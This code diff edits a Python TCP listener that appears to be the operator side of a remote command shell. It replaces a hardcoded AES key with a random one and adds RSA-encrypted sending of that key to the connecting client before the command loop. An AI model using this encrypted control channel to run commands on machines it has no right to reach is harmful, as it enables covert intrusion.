@@ -1,6 +1,7 @@
 # TCP Server
 from socket import socket, AF_INET, SOCK_STREAM
-from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util import Counter
 import os
 
@@ -9,12 +10,21 @@ class Server:
     def __init__(self):
         self.IP = '<SERVER-IP-ADDRESS>'
         self.PORT = 8080
-        self.key = b';6\xbd\x87\x91\x04\x8e%\xca\xf2s\x7f\x13\xaa\xe6a\xc3\x13\xe0\t\x060\xe1U\xbe\xf2\x9e\xf6\x18\xdc\x9b8'
+        self.key = os.urandom(32)   # generate random 32 bytes key
         self.USERNAME = 'User@User'
         
     def str_xor(self, s1, s2):
         ''' Encrypt/Decrypt function '''
         return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
+
+    def encrypt_AES_KEY(self, KEY):
+        ''' Encrypt using RSA public key '''
+        # read pem file or embed key to script
+        publickey = open('src/public.pem', 'r').read()
+        encryptor = RSA.importKey(publickey)
+        cipher = PKCS1_OAEP.new(encryptor)
+        encriptedData = cipher.encrypt(KEY)
+        return encriptedData
 
     def encrypt(self, message):
         ''' AES encrypt algorithm using CTR mode, takes bytes variable '''
@@ -61,6 +71,8 @@ class Server:
         # port in a tuple format (IP,port)
         conn, addr = s.accept() 
         print('[+] Connection Received: ', addr)
+        # send encrypted key
+        conn.send(self.encrypt_AES_KEY(self.key))
         self.USERNAME = self.decrypt(conn.recv(1024)).decode()
         while True:
             # Get user input and store it in command variable
